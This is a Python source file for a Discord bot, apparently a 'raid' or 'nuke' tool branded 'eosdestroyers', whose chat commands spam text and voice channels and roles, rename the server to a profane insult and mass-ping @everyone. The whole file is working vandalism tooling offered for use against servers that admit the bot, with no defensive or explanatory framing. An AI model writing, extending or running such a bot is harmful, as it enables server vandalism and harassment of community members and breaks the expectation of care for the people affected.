import discord


client = discord.Client()


@client.event
async def on_ready():
    print('Has login as {0.user}'.format(client))
    activity = discord.Activity(name='free bot at | github.com/eosdestroyers', type=discord.ActivityType.streaming)
    await client.change_presence(activity=activity)


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('.destroy'):
        guild = message.author.guild
        count = 0
        while (count < 3):
            await guild.create_text_channel('eos-destroyers')#all functions
            await guild.create_role(name="eos")
            await guild.edit(reason = None, name = "fucked by eosdestroyers")
            await guild.create_voice_channel('eos destroyers')
            message.channel.send("Get fucked by EOS DESTROYERS ||@everyone||")

            count += 1

    if message.content.startswith('.raid'):
        guild = message.author.guild
        btw = 0
        while (btw < 5):
            await guild.create_text_channel('eos destroyers')#only text channel spam
            btw += 1

    if message.content.startswith('.rolecreate'):
        guild = message.author.guild
        yaw = 0
        while (yaw < 5):
            await guild.create_role(name="fucked by eosdestroyers")#only role spam
            yaw += 1
    
    if message.content.startswith('.servername'):
        guild = message.author.guild#edits name of server
        await guild.edit(reason = None, name = "eos destroyers")

    if message.content.startswith('.everyone'):
       guild = message.author.guild
       await message.channel.send("fucked by eosdestroyers ||@everyone||")
client.run('token')
